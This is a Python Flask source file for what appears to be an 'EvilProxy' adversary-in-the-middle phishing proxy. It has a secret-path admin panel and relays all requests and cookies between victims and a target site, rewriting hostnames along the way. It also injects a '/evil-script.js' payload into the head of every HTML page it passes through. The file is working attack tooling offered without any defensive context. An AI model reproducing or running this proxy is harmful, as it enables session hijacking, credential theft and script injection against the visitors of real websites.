from flask import Flask, request, Response, send_from_directory
import requests
import brotli
import re

def start_proxy(target, host, port, secret):
    app = Flask(__name__)

    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/ep/assets/EvilProxyBanner.png')
    def panel_banner():
        return send_from_directory('panel', 'EvilProxyBanner.png')

    @app.route('/evil-script.js')
    def payload():
        return send_from_directory('.', 'evil-script.js')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
    def proxy(path):
        target_url = f"https://{target}/{path}"

        headers = {key: value for key, value in request.headers if key.lower() != 'host'}
        headers['Host'] = target

        if 'Cookie' in request.headers:
            cookies = request.headers['Cookie'].replace(host, target)
            headers['Cookie'] = cookies

        resp = requests.request(
            request.method,
            target_url,
            headers=headers,
            params=request.args,
            data=request.form,
            allow_redirects=False
        )

        response_headers = {key: value for key, value in resp.headers.items() if key.lower() not in ['content-encoding', 'transfer-encoding', 'date', 'server', 'connection']}

        # Brotli Encoding Handler
        resp_content = resp.content
        if 'content-encoding' in resp.headers and 'br' in resp.headers['content-encoding']:
            try:
                resp_content = brotli.decompress(resp.content)
            except brotli.error as e:
                pass  # Likely a non-brotli encoded response

        # Payload Injection
        if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
            resp_content = resp_content.decode('utf-8')
            resp_content = re.sub(r'<head>', r'<head><script src="/evil-script.js"></script>', resp_content)
            resp_content = resp_content.encode('utf-8')

        for key in response_headers:
            response_headers[key] = response_headers[key].replace(target, host)

        return Response(resp_content, status=resp.status_code, headers=response_headers)

    app.run(host=host, port=port)
